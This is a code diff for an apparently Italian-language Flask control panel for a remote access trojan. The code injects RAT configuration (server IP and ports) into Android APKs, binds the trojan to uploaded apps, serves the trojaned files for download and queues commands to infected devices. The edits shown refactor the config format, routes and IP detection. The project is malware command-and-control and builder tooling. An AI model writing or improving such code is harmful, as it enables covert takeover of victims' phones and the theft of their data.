@@ -407,8 +407,8 @@ def inject_rat_code(username, decoded_path, server_ip, server_port, flask_port):
         except:
             local_ip = "192.168.1.100"  # Fallback to a common local IP
     
-    # Generate config.ini with both local and public IPs, Flask Port (for API calls) and RAT Port (for socket connections)
-    config_content = f"LOCAL_IP={local_ip}\nPUBLIC_IP={server_ip}\nFLASK_PORT={flask_port}\nRAT_PORT={server_port}\n"
+    # Generate config.ini with both local and public IPs and PORT
+    config_content = f"[SERVER]\nLOCAL_IP={local_ip}\nPUBLIC_IP={server_ip}\nPORT={flask_port}\n"
     config_file_path = os.path.join(assets_dir_path, "config.ini")
     with open(config_file_path, "w") as f:
         f.write(config_content)
@@ -625,7 +625,7 @@ def login():
             error = "Invalid username. Must be at least 2 characters."
     return render_template('login.html', error=error)
 
-@app.route("/", methods=["GET", "POST"])
+@app.route("/old", methods=["GET", "POST"])
 @login_required
 def index():
     username = session['username']
@@ -1094,6 +1094,11 @@ def send_rat_command():
     append_flask_log(username, f"Command '{command}' queued for device {device_id}")
     return jsonify({"status": "ok", "message": "Command sent"})
 
+@app.route('/')
+def root():
+    """Redirect to dashboard"""
+    return redirect(url_for('dashboard'))
+
 @app.route('/dashboard')
 def dashboard():
     """Main dashboard page"""
@@ -1130,14 +1135,26 @@ def dashboard():
 @login_required
 def bind_apk():
     """APK binding page"""
+    # Get local IP address using our more reliable function
+    local_ip = get_local_ip()
+    
+    # Try to get public IP
+    public_ip = "Non disponibile"
+    try:
+        response = requests.get('https://api.ipify.org', timeout=3)
+        if response.status_code == 200:
+            public_ip = response.text
+    except:
+        pass
+        
     if request.method == 'POST':
         # Check if the post request has the file part
         if 'apk_file' not in request.files:
-            return render_template('bind.html', error="Nessun file selezionato")
+            return render_template('bind.html', error="Nessun file selezionato", local_ip=local_ip, public_ip=public_ip)
         
         apk_file = request.files['apk_file']
         if apk_file.filename == '':
-            return render_template('bind.html', error="Nessun file selezionato")
+            return render_template('bind.html', error="Nessun file selezionato", local_ip=local_ip, public_ip=public_ip)
         
         # Get form data
         local_ip = request.form.get('local_ip', '')
@@ -1228,29 +1245,10 @@ def bind_apk():
                                   download_link=download_link)
             
         except Exception as e:
-            return render_template('bind.html', error=f"Errore durante il binding: {str(e)}")
+            return render_template('bind.html', error=f"Errore durante il binding: {str(e)}", local_ip=local_ip, public_ip=public_ip)
     
     # GET request - show the form
-    # Get local IP address
-    local_ip = socket.gethostbyname(socket.gethostname())
-    if local_ip == "127.0.0.1":
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            local_ip = s.getsockname()[0]
-            s.close()
-        except:
-            local_ip = "127.0.0.1"
-    
-    # Try to get public IP
-    public_ip = ""
-    try:
-        response = requests.get('https://api.ipify.org', timeout=3)
-        if response.status_code == 200:
-            public_ip = response.text
-    except:
-        pass
-    
+    # local_ip and public_ip are already set at the beginning of the function
     return render_template('bind.html', local_ip=local_ip, public_ip=public_ip, port=FLASK_WEB_PORT)
 
 @app.route('/download/<username>/<filename>')
